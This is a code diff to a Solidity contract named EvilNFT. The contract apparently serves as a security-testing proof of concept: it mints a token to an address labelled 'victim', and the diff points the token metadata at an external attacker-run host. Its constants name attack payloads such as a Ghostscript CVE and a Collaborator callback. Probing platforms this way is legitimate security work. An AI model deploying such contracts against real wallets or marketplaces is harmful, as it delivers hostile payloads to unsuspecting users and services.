@@ -43,10 +43,20 @@ contract EvilNFT is ERC721, Ownable {
     uint256 public constant GHOSTSCRIPT_CVE_2019_14813    = 34;
     uint256 public constant COLLABORATOR    = 35;
 
-    constructor() ERC721("hack", "HACK") {
-        address victim = 0x321639C6572dE66253DeC41a959cD00137f1D476;
-        for (uint i = 0; i <= COLLABORATOR; i++) {
-          _mint(victim, i);
-        }
+    constructor() ERC721("hack721", "HACK721") {
+		address victim = 0x321639c6572de66253dec41a959cd00137f1d476;
+		_mint(victim, 0);
     }   
+
+	function _baseURI() internal view virtual returns (string memory) {
+        return "https://evil-nft-h1kk4.vercel.app/api/";
+    }
+
+	function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
+        _requireMinted(tokenId);
+
+        string memory baseURI = _baseURI();
+		string memory json = ".json";
+        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString(), json)) : "";
+    }
 }
